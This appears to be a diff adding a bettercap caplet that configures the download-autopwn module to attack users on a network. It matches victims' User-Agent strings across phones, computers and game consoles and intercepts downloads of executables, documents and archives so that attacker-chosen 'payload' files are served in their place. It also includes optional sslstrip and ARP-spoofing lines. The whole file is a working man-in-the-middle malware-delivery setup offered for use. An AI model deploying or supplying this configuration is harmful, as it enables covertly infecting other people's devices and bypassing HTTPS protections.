@@ -1,0 +1,51 @@
+# documentation can be found at https://github.com/bettercap/caplets/...
+# 
+# this module lets you intercept very specific download requests and replaces the payload with one of your choice
+#
+# in order for a download to get intercepted:
+#    1. the victim's user-agent string must match the downloadautopwn.useragent.x regexp value
+#    2. the requested file must match one of the downloadautopwn.extensions.x file extensions
+#
+# you can find the downloadautopwn.devices in the caplets/download-autopwn/ folder (you can add your own)
+#
+
+# choose the devices from which downloads get pwned (enter the dir names of choice from caplets/download-autopwn/)
+# (or feel free to add your own)
+set downloadautopwn.devices android,ios,linux,macos,ps4,windows,xbox
+
+# choose the regexp value that the victim's User-Agent has to match
+# (feel free to add your own)
+set downloadautopwn.useragent.android  Android
+set downloadautopwn.useragent.ios      iPad|iPhone|iPod
+set downloadautopwn.useragent.linux    Linux
+set downloadautopwn.useragent.macos    Intel Mac OS X 10_
+set downloadautopwn.useragent.ps4      PlayStation 4
+set downloadautopwn.useragent.windows  Windows|WOW64
+set downloadautopwn.useragent.xbox     Xbox
+
+# choose which file extensions get intercepted and replaced by your payload on specific devices (payloads are in caplets/download-autopwn/.../)
+# (again, you can add as many as you want)
+# make sure the payload files exist and that they are all named "payload" (for example: payload.exe)
+set downloadautopwn.extensions.android  apk,pdf,sh,pfx,zip
+set downloadautopwn.extensions.ios      ipa,ios,ipb,ipsw,ipsx,ipcc,mobileconfig,pdf,zip
+set downloadautopwn.extensions.linux    c,go,sh,py,rb,cr,pl,deb,pdf,jar,zip
+set downloadautopwn.extensions.macos    app,dmg,doc,docx,jar,ai,ait,psd,pdf,c,go,sh,py,rb,pl,terminal,zip
+set downloadautopwn.extensions.ps4      disc,pup,pdf,doc,docx,zip
+set downloadautopwn.extensions.windows  exe,msi,bat,jar,dll,doc,docx,swf,psd,ai,ait,pdf,rar,zip
+set downloadautopwn.extensions.xbox     exe,msi,jar,pdf,doc,docx,zip
+
+# choose whether the proxy module resizes your payload to the requested file's size (if not set then default=false)
+set downloadautopwn.resizepayloads true
+
+# set download-autopwn.js as proxy script
+set http.proxy.script caplets/download-autopwn.js
+# uncomment if you want sslstrip enabled
+# set http.proxy.sslstrip true
+# start proxy
+http.proxy on
+
+# wait for everything to start properly
+sleep 1
+
+# uncomment if you want arp spoofing (make sure probing is off as it conflicts with arp spoofing)
+# arp.spoof on
